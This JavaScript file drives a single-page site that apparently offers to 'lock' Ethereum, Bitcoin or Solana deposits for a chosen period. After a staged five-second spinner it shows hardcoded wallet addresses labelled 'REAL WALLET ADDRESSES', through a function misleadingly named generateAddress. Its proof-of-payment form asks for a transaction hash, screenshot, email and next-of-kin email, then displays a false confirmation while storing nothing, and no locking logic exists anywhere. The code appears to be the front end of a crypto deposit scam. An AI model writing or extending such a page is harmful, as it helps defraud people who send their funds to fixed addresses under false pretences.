function gotoPage(page) {
  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
  const pageMap = {
    home: 'homePage',
    overview: 'overviewPage',
    about: 'aboutPage',
    contact: 'contactPage',
    whitepaper: 'whitepaperPage'
  };
  if (pageMap[page]) {
    document.getElementById(pageMap[page]).style.display = 'block';
  }
  document.getElementById('mainNav').querySelector('.nav-links').classList.remove('active');
}

function toggleMenu() {
  const navLinks = document.getElementById('mainNav').querySelector('.nav-links');
  navLinks.classList.toggle('active');
}

let selectedAsset = null;
let selectedPeriod = null;

function openPeriod(asset) {
  selectedAsset = asset;
  selectedPeriod = null;
  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
  document.getElementById('periodPage').style.display = 'block';
  document.getElementById('selectedAssetTitle').textContent = asset;
  document.getElementById('depositArea').style.display = 'none';
  document.getElementById('addressBox').style.display = 'none';
  document.getElementById('otherHelp').style.display = 'none';
  document.getElementById('proofForm').reset();
  document.getElementById('proofMsg').textContent = '';

  // Reset address spoiler UI
  const addrBtn = document.getElementById('showAddressBtn');
  const addrSpinner = document.getElementById('addressSpinner');
  const addrRevealed = document.getElementById('addressRevealed');
  if (addrBtn) addrBtn.style.display = '';
  if (addrSpinner) addrSpinner.style.display = 'none';
  if (addrRevealed) addrRevealed.style.display = 'none';

  toggleProofButton(); // Ensure button is reset when opening
}

function closePeriod() { gotoPage('home'); }

function selectPeriod(period) {
  selectedPeriod = period;
  showDepositArea();
}
function selectCustomPeriod() {
  const val = document.getElementById('customPeriod').value.trim();
  if (val) {
    selectedPeriod = val;
    showDepositArea();
  }
}

function showDepositArea() {
  document.getElementById('depositArea').style.display = 'block';
  if (selectedAsset === 'Other') {
    document.getElementById('addressBox').style.display = 'none';
    document.getElementById('otherHelp').style.display = 'block';
  } else {
    document.getElementById('addressBox').style.display = 'flex';
    document.getElementById('otherHelp').style.display = 'none';

    // Reset address spoiler UI
    const addrBtn = document.getElementById('showAddressBtn');
    const addrSpinner = document.getElementById('addressSpinner');
    const addrRevealed = document.getElementById('addressRevealed');
    if (addrBtn) addrBtn.style.display = '';
    if (addrSpinner) addrSpinner.style.display = 'none';
    if (addrRevealed) addrRevealed.style.display = 'none';
  }
  document.getElementById('proofMsg').textContent = '';
  document.getElementById('proofForm').reset();

  toggleProofButton(); // Ensure button is reset when showing
}

// Spoiler click logic for address
function revealAddress() {
  const addrBtn = document.getElementById('showAddressBtn');
  const addrSpinner = document.getElementById('addressSpinner');
  const addrRevealed = document.getElementById('addressRevealed');
  if (addrBtn) addrBtn.style.display = 'none';
  if (addrSpinner) addrSpinner.style.display = '';
  if (addrRevealed) addrRevealed.style.display = 'none';

  setTimeout(() => {
    if (addrSpinner) addrSpinner.style.display = 'none';
    if (addrRevealed) {
      addrRevealed.querySelector('.address-text').textContent = generateAddress(selectedAsset);
      addrRevealed.style.display = '';
    }
  }, 5000);
}

function copyAddress() {
  const addr = document.getElementById('addressRevealed').querySelector('.address-text').textContent;
  if (!addr) return;
  navigator.clipboard.writeText(addr);
  alert('Address copied to clipboard!');
}

// REAL WALLET ADDRESSES USED HERE
function generateAddress(asset) {
  if (asset === 'Ethereum') return '0xe46cb5bf7e87eabe8909854a79971a61d0c27109';
  if (asset === 'Bitcoin') return 'bc1q7kpveyg6pj5dkls70k9l0ncs2frkk2c3dxc5yq';
  if (asset === 'Solana') return 'CNz5yg8aqTbZ4T86doU6uUctLNvwojQZ7V4FvaYvPjEy';
  return '';
}

// Enable submit proof button only when mandatory fields filled
function toggleProofButton() {
  const txHash = document.getElementById('txHash').value.trim();
  const fromAddress = document.getElementById('fromAddress').value.trim();
  const btn = document.getElementById('proofSubmitBtn');
  if (txHash && fromAddress) {
    btn.disabled = false;
  } else {
    btn.disabled = true;
  }
}

// Proof of payment form
function submitProof(event) {
  event.preventDefault();
  const txHash = document.getElementById('txHash').value.trim();
  const fromAddress = document.getElementById('fromAddress').value.trim();
  const picInput = document.getElementById('paymentPic');
  const userEmail = document.getElementById('userEmail').value.trim();
  const nextOfKinEmail = document.getElementById('nextOfKinEmail').value.trim();
  if (!txHash || !fromAddress || !picInput.files.length) {
    document.getElementById('proofMsg').textContent = 'Please fill in all required fields and attach a screenshot.';
    document.getElementById('proofMsg').style.color = '#dc2626';
    return;
  }
  // (Optional: You may want to actually process/store userEmail and nextOfKinEmail server-side)
  document.getElementById('proofMsg').textContent = 'Thank you! Proof received. Our team will review and confirm your lock.';
  document.getElementById('proofMsg').style.color = '#16a34a';
  document.getElementById('proofForm').reset();
  toggleProofButton();
}

window.onload = function() {
  gotoPage('home');
};
